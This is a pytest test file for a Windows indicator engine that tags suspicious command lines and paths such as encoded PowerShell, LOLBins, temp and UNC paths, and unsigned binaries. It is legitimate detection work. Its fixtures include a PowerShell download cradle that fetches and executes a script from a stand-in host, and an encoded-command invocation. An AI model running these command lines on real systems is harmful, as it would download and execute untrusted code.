"""Indicator engine: detection but NO verdict rules."""

from __future__ import annotations

from app.analysis.indicators import IndicatorEngine
from app.models.enums import IndicatorType
from tests.conftest import make_entry

ENGINE = IndicatorEngine()


def _tags(entry) -> list[str]:
    return [i.tag for i in entry.indicators]


def test_powershell_encoded_command():
    e = make_entry(command=r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGU')
    ENGINE.analyze(e)
    tags = _tags(e)
    assert IndicatorType.ENCODED_COMMAND.value in tags
    assert IndicatorType.SCRIPT.value in tags


def test_download_cradle_and_url():
    e = make_entry(
        command=r'powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).DownloadString("http://evil.example/x.ps1")')
    ENGINE.analyze(e)
    tags = _tags(e)
    assert IndicatorType.DOWNLOAD_CRADLE.value in tags
    assert IndicatorType.REMOTE_URL.value in tags


def test_base64_like_content():
    e = make_entry(arguments="--data SGVsbG8gV29ybGQgdGVzdCBzdHJpbmc=")
    ENGINE.analyze(e)
    assert IndicatorType.BASE64.value in _tags(e)


def test_lolbin_alone_is_minor_flag():
    e = make_entry(command=r'C:\Windows\System32\regsvr32.exe /s "C:\x\a.dll"')
    ENGINE.analyze(e)
    tags = _tags(e)
    assert any(t == IndicatorType.LOLBIN.value for t in tags)


def test_user_writable_and_temp_path():
    e = make_entry(path=r"C:\Users\bob\AppData\Local\Temp\x.exe")
    ENGINE.analyze(e)
    tags = _tags(e)
    assert IndicatorType.TEMP_PATH.value in tags
    assert IndicatorType.USER_WRITABLE_PATH.value in tags


def test_unc_path():
    e = make_entry(path=r"\\server\share\evil.exe")
    ENGINE.analyze(e)
    tags = _tags(e)
    assert IndicatorType.UNC_PATH.value in tags
    assert IndicatorType.NETWORK_PATH.value in tags


def test_system_account_and_privileged():
    e = make_entry(user="SYSTEM", architecture="Highest", source="Scheduled Task")
    ENGINE.analyze(e)
    tags = _tags(e)
    assert IndicatorType.SYSTEM_USER.value in tags
    assert IndicatorType.PRIVILEGED.value in tags


def test_unsigned_indicator():
    e = make_entry(signer_status="Unsigned")
    ENGINE.analyze(e)
    assert IndicatorType.UNSIGNED.value in _tags(e)


def test_plain_microsoft_thing_is_not_flagged_malicious():
    """A signed Microsoft binary with benign args must not be 'malicious'."""
    e = make_entry(
        command=r'"C:\Windows\System32\notepad.exe" C:\Users\a\notes.txt',
        signer_status="Signed",
    )
    ENGINE.analyze(e)
    # still allowed to have a generic signer indicator if signed -> none
    assert IndicatorType.UNSIGNED.value not in _tags(e)
    # and no download/encoded/obfuscation flags
    for skip in (IndicatorType.ENCODED_COMMAND.value, IndicatorType.DOWNLOAD_CRADLE.value,
                 IndicatorType.OBFUSCATION.value):
        assert skip not in _tags(e)


def test_reset_between_entries():
    a = make_entry(command="powershell -enc X")
    b = make_entry(command="notepad.exe", path="")
    ENGINE.analyze(a)
    ENGINE.analyze(b)
    assert _tags(b) == []  # fresh entry, no stale indicators